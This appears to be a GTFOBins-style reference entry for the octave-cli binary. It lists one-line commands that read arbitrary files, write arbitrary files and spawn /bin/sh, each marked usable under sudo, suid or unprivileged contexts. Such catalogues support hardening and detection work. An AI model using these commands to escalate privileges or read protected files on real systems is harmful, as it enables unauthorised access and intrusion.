---
type: gtfobin
name: octave
platform: Unix
functions: [file-read, file-write, shell]
tags: [gtfobin, unix, lotl]
---

# octave

## file-read

```bash
octave-cli --eval 'format none; fid = fopen("/path/to/input-file"); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'
```
**Contexts:** sudo, suid, unprivileged

## file-write

```bash
octave-cli --eval 'fid = fopen("/path/to/output-file", "w"); fputs(fid, "DATA"); fclose(fid);'
```
**Contexts:** sudo, suid, unprivileged

## shell

```bash
octave-cli --eval 'system("/bin/sh")'
```
**Contexts:** sudo, suid, unprivileged
